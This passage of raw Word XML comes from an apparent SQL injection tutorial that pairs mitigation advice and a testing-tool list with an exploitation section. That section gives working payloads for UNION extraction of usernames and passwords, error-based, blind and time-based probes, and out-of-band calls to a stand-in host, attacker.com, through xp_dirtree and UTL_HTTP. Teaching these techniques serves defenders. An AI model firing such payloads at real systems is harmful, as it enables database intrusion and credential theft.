          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>('</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>whoami</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BE5E3DF" w14:textId="6B3B5B8B" w:rsidR="0098101F" w:rsidRDefault="0098101F" w:rsidP="00A71108">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:divId w:val="1254969984"/>
      </w:pPr>
      <w:bookmarkStart w:id="150" w:name="_Toc208408621"/>
      <w:r>
        <w:t>Mitigation Strategies</w:t>
      </w:r>
      <w:bookmarkEnd w:id="150"/>
    </w:p>
    <w:p w14:paraId="5D639CAE" w14:textId="77777777" w:rsidR="0098101F" w:rsidRDefault="0098101F">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1254969984"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>✔</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> Use Parameterized Queries / Prepared Statements</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>✔</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> Use Stored Procedures with parameters</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>✔</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> Whitelist validation</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>✔</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> Apply least privilege principle</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>✔</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> Deploy WAFs &amp; suppress DB errors</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>✔</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> Continuous security testing</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="517EA1AA" w14:textId="77777777" w:rsidR="0098101F" w:rsidRDefault="0098101F">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:divId w:val="1254969984"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="151" w:name="_Toc208408622"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Times New Roman" w:hAnsi="Calibri"/>
          <w:color w:val="366091"/>
        </w:rPr>
        <w:t>8. Tools for Testing</w:t>
      </w:r>
      <w:bookmarkEnd w:id="151"/>
    </w:p>
    <w:p w14:paraId="020CEA87" w14:textId="77777777" w:rsidR="0098101F" w:rsidRDefault="0098101F">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1254969984"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>sqlmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">, Burp Suite, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>FuzzDB</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Havij</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> (legacy), </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>MySqloit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>sqlbftools</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="72A453BF" w14:textId="150C48D2" w:rsidR="0098101F" w:rsidRPr="00F8650C" w:rsidRDefault="0098101F" w:rsidP="00F8650C">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1254969984"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Times New Roman" w:hAnsi="Calibri"/>
          <w:color w:val="366091"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Expanded Exploitation Techniques</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="252DB894" w14:textId="77777777" w:rsidR="0098101F" w:rsidRDefault="0098101F" w:rsidP="00E73FED">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:divId w:val="1254969984"/>
      </w:pPr>
      <w:bookmarkStart w:id="152" w:name="_Toc208408623"/>
      <w:r>
        <w:t>1. Union-based SQL Injection</w:t>
      </w:r>
      <w:bookmarkEnd w:id="152"/>
    </w:p>
    <w:p w14:paraId="660ED8B6" w14:textId="77777777" w:rsidR="0098101F" w:rsidRDefault="0098101F">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1254969984"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Concept: The UNION operator lets attackers append their own SELECT statements to the original query. It requires knowing the number of columns and which are visible.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>Steps:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>1. Find column count: ' ORDER BY 1--, ' ORDER BY 2-- ...</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>2. Identify visible columns: ' UNION SELECT NULL,NULL,NULL--</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">3. Extract data: ' UNION SELECT </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>username,password,NULL</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> FROM users--</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="629C9AE0" w14:textId="77777777" w:rsidR="0098101F" w:rsidRDefault="0098101F" w:rsidP="00E73FED">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:divId w:val="1254969984"/>
      </w:pPr>
      <w:bookmarkStart w:id="153" w:name="_Toc208408624"/>
      <w:r>
        <w:t>2. Error-based SQL Injection</w:t>
      </w:r>
      <w:bookmarkEnd w:id="153"/>
    </w:p>
    <w:p w14:paraId="2CEE7EA2" w14:textId="77777777" w:rsidR="0098101F" w:rsidRDefault="0098101F">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1254969984"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Concept: Relies on database error messages to leak information.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>Examples:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">MySQL: ' AND </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>updatexml</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>(1,concat(0x7e,(SELECT database())),0)--</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>MSSQL: ' AND 1=CONVERT(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>int</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>,(SELECT @@version))--</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="547CDEF9" w14:textId="77777777" w:rsidR="0098101F" w:rsidRDefault="0098101F" w:rsidP="00E73FED">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:divId w:val="1254969984"/>
      </w:pPr>
      <w:bookmarkStart w:id="154" w:name="_Toc208408625"/>
      <w:r>
        <w:t>3. Boolean-based Blind SQL Injection</w:t>
      </w:r>
      <w:bookmarkEnd w:id="154"/>
    </w:p>
    <w:p w14:paraId="5582D34B" w14:textId="77777777" w:rsidR="0098101F" w:rsidRDefault="0098101F">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1254969984"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Concept: Infers data using true/false conditions.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>Examples:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>' AND 1=1-- → Page loads normally</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">' AND 1=2-- → Page changes </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>behavior</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>Data extraction: ' AND SUBSTRING((SELECT database()),1,1)='m'--</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16F0C01C" w14:textId="77777777" w:rsidR="0098101F" w:rsidRDefault="0098101F" w:rsidP="00E73FED">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:divId w:val="1254969984"/>
      </w:pPr>
      <w:bookmarkStart w:id="155" w:name="_Toc208408626"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>4. Time-based Blind SQL Injection</w:t>
      </w:r>
      <w:bookmarkEnd w:id="155"/>
    </w:p>
    <w:p w14:paraId="2D06C02C" w14:textId="77777777" w:rsidR="0098101F" w:rsidRDefault="0098101F">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1254969984"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Concept: Uses delays to infer data when no visual feedback is available.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>Examples:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>MySQL: ' OR IF(SUBSTRING(@@version,1,1)='5', SLEEP(5), 0)--</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">MSSQL: '; IF (SELECT TOP 1 name FROM </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>sys.databases</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>)='master' WAITFOR DELAY '00:00:05'--</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77073531" w14:textId="77777777" w:rsidR="0098101F" w:rsidRDefault="0098101F" w:rsidP="00E73FED">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:divId w:val="1254969984"/>
      </w:pPr>
      <w:bookmarkStart w:id="156" w:name="_Toc208408627"/>
      <w:r>
        <w:t>5. Out-of-Band SQL Injection (OAST)</w:t>
      </w:r>
      <w:bookmarkEnd w:id="156"/>
    </w:p>
    <w:p w14:paraId="6A909781" w14:textId="77777777" w:rsidR="0098101F" w:rsidRDefault="0098101F">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1254969984"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Concept: Exploits DB features that trigger external network requests (HTTP, DNS).</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>Examples:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>MSSQL: '; exec master..</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>xp_dirtree</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> '//attacker.com/test'--</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">Oracle: ' UNION SELECT </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>UTL_HTTP.request</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>('http://attacker.com/test') FROM dual--</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48110FB2" w14:textId="77777777" w:rsidR="0098101F" w:rsidRDefault="0098101F" w:rsidP="004B7CA3">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:divId w:val="1254969984"/>
      </w:pPr>
      <w:bookmarkStart w:id="157" w:name="_Toc208408628"/>
      <w:r>
        <w:t>6. Second-Order SQL Injection</w:t>
      </w:r>
      <w:bookmarkEnd w:id="157"/>
    </w:p>
    <w:p w14:paraId="519405B7" w14:textId="77777777" w:rsidR="0098101F" w:rsidRDefault="0098101F">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1254969984"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Concept: Payload stored in DB is later executed in unsafe query reuse.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>Example: Register user with username "admin' --" which later breaks admin panel queries.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36AC2675" w14:textId="77777777" w:rsidR="0098101F" w:rsidRDefault="0098101F" w:rsidP="004B7CA3">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:divId w:val="1254969984"/>
      </w:pPr>
      <w:bookmarkStart w:id="158" w:name="_Toc208408629"/>
      <w:r>
        <w:t>7. Stacked Queries</w:t>
      </w:r>
      <w:bookmarkEnd w:id="158"/>
    </w:p>
    <w:p w14:paraId="054C1C57" w14:textId="77777777" w:rsidR="0098101F" w:rsidRDefault="0098101F">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1254969984"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Concept: Some DBs allow multiple queries separated by semicolons.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
